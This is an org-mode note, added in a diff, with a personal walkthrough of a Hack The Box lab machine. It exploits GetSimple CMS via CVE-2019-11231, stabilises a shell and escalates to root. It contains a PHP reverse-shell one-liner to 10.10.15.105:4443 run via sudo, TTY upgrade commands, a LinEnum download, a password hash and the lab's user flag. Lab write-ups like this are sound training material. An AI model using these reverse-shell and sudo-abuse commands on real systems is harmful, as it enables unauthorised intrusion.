@@ -1,0 +1,90 @@
+# 202411200013 htb-first-box
+===
+tags: 
+===
+
+
+#+DOWNLOADED: file:C%3A/Users/shyam/Desktop/screenshot_20241120_001433.png @ 2024-11-20 00:14:53
+[[file:2024-11-20_00-14-53_screenshot_20241120_001433.png]]
+
+
+
+#+DOWNLOADED: file:C%3A/Users/shyam/Desktop/screenshot_20241120_001925.png @ 2024-11-20 00:21:40
+[[file:2024-11-20_00-21-40_screenshot_20241120_001925.png]]
+
+username -> admin
+password -> d033e22ae348aeb5660fc2140aec35850c4da997
+
+checking the URL http://10.129.196.221/data/other/logs/ results in a /failedlogins.log/ file
+being downloaded. and from that it's clear that /admin/ is a valid username, as opposed to
+/admin@gettingstarted.com/ 
+using the /apikey/ from above as password also fails.
+
+* CVE-2019-11231
+  - after googling for manual exploits, this came up. So, it turns out, with just the above info
+    -> the api key and the admin username, it's possible to bypass authentication and upload
+    arbitrary php files.
+  - this is available in /searchsploit/
+    download it to the current folder with the following
+    #+BEGIN_SRC bash
+      searchsploit -m <exploit path>
+    #+END_SRC
+  - run the exploit like below; with a netcat listener on 4443
+
+    #+DOWNLOADED: file:D%3A/code/htb/academy/academy-writeups/screenshot_20241123_233903.png @ 2024-11-26 00:00:26
+    [[file:CVE-2019-11231/2024-11-26_00-00-26_screenshot_20241123_233903.png]]
+
+
+* initial foothold
+  - get a nicer terminal with the below (from [[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/][ropnop-blog]])
+    #+BEGIN_SRC bash
+      # In reverse shell
+      $ python -c 'import pty; pty.spawn("/bin/bash")'
+      Ctrl-Z
+
+      # In Kali
+      $ stty raw -echo
+      $ fg
+
+      # In reverse shell
+      $ reset
+      $ export SHELL=bash
+      $ export TERM=xterm-256color
+      $ stty rows <num> columns <cols>
+      #+END_SRC
+** other shell stabilization options
+    #+BEGIN_SRC bash
+    /usr/bin/script -qc /bin/bash /dev/null
+    #+END_SRC
+* user.txt
+  7002d65b149b0a4d19132a66feed21d8
+
+* privilege escalation
+** LinEnum download
+   #+BEGIN_SRC bash
+     wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+   #+END_SRC
+   after running /LinEnum/, we find that we have full sudo access to */usr/bin/php*, so:
+   #+BEGIN_SRC bash
+     sudo /usr/bin/php -r '$sock=fsockopen("10.10.15.105",4443);exec("/bin/sh -i <&3 >&3 2>&3");'
+   #+END_SRC
+* root flag
+  available in /root/root.txt
+
+* privilege escalation - another method
+  running /linpeas.sh/, the user /mrb3n/, sticks out; also, the non PE flag was found in this
+  user's home directory
+  /linpeas/ suggests:
+  =Do not forget to test 'su' as any other user with shell: without password and with their=
+  =names as password=
+  the above doesn't work
+
+* things I missed:
+** gaining a foothold
+   login with admin:admin would have worked
+** privilege escalation
+   since PHP itself was runnable with sudo, it didn't need another reverse shell for root
+   access; could have just done
+   #+BEGIN_SRC bash
+     sudo php -r "system('$CMD');"
+   #+END_SRC
